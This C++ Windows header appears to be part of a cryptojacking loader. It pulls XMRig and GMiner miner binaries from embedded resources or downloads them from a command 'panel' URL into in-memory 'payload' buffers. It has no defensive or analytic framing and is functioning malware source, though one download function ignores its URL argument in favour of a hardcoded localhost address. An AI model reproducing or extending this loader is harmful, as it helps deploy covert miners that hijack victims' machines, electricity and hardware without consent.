// embedded_resource.h
#pragma once
#include <windows.h>
#include <cstdint>
#include <utility>
#include "resources.h"  // Include the resource IDs
#include "httplib.h"
#include <stdexcept>

void LoadEmbeddedXMRig(BYTE*& payloadBuf, size_t& payloadSize) {
    HMODULE hModule = GetModuleHandle(nullptr);
    if (!hModule) throw std::runtime_error("Failed to get module handle.");

    HRSRC hRes = FindResource(hModule, MAKEINTRESOURCE(EMBEDDED_XMRIG), RT_RCDATA);
    if (!hRes) throw std::runtime_error("Failed to find XMRig resource.");

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) throw std::runtime_error("Failed to load XMRig resource.");

    LPVOID pData = LockResource(hResData);
    if (!pData) throw std::runtime_error("Failed to lock XMRig resource.");

    DWORD size = SizeofResource(hModule, hRes);
    if (size == 0) throw std::runtime_error("XMRig resource size is zero.");

    payloadBuf = new BYTE[size];
    memcpy(payloadBuf, pData, size);
    payloadSize = static_cast<size_t>(size);
}

void LoadEmbeddedGminer(BYTE*& payloadBuf, size_t& payloadSize) {
    HMODULE hModule = GetModuleHandle(nullptr);
    if (!hModule) throw std::runtime_error("Failed to get module handle.");

    HRSRC hRes = FindResource(hModule, MAKEINTRESOURCE(EMBEDDED_GMINER), RT_RCDATA);
    if (!hRes) throw std::runtime_error("Failed to find gminer resource.");

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) throw std::runtime_error("Failed to load gminer resource.");

    LPVOID pData = LockResource(hResData);
    if (!pData) throw std::runtime_error("Failed to lock gminer resource.");

    DWORD size = SizeofResource(hModule, hRes);
    if (size == 0) throw std::runtime_error("Gminer resource size is zero.");

    payloadBuf = new BYTE[size];
    memcpy(payloadBuf, pData, size);
    payloadSize = static_cast<size_t>(size);
}


void LoadXmrigFromPanel(std::string panelUrl, BYTE*& payloadBuf, size_t& payloadSize) 
{
    httplib::Client client(panelUrl);

    payloadBuf = nullptr;
    payloadSize = 0;

    try {
        auto res = client.Get("/FetchXmrig");

        if (res && res->status == 200) {

            payloadSize = res->body.size();
            printf("Size Of Res: %zu\n", payloadSize);

            payloadBuf = new BYTE[payloadSize];
            memcpy(payloadBuf, res->body.data(), payloadSize);

            std::cout << "File downloaded successfully\n";
        }
        else {
            std::cerr << "HTTP error occurred: "
                      << (res ? std::to_string(res->status) : "No response") << std::endl;
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Error occurred: " << e.what() << std::endl;
    }

    if (!payloadBuf || payloadSize == 0) {
        std::cerr << "Download failed or file was empty!" << std::endl;
    }
}

void LoadGMinerFromPanel(std::string panelUrl, BYTE*& payloadBuf, size_t& payloadSize) 
{
    httplib::Client client("http://127.0.0.1:8080");

    payloadBuf = nullptr;
    payloadSize = 0;

    try {
        auto res = client.Get("/FetchGMiner");

        if (res && res->status == 200) {

            payloadSize = res->body.size();
            printf("Size Of Res: %zu\n", payloadSize);

            payloadBuf = new BYTE[payloadSize];
            memcpy(payloadBuf, res->body.data(), payloadSize);

            std::cout << "File downloaded successfully\n";
        }
        else {
            std::cerr << "HTTP error occurred: "
                      << (res ? std::to_string(res->status) : "No response") << std::endl;
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Error occurred: " << e.what() << std::endl;
    }

    if (!payloadBuf || payloadSize == 0) {
        std::cerr << "Download failed or file was empty!" << std::endl;
    }
}